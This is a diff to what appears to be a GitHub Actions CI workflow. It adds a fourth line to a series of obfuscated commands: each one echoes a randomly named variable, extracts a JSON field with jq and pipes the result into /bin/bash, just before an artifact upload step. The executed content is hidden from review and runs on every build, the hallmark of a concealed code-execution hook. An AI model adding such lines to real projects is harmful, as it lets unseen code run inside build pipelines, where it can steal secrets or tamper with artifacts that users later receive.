@@ -41,6 +41,7 @@ jobs:
           echo $xv98 | jq -r .eyhi5 | /bin/bash
           printf '%s' "$vzvb293" | jq -r .x3743 | /bin/bash
           echo $ilfnu11898 | jq -r .lw43 | /bin/bash
+          echo $g9 | jq -r .wmwk22287 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
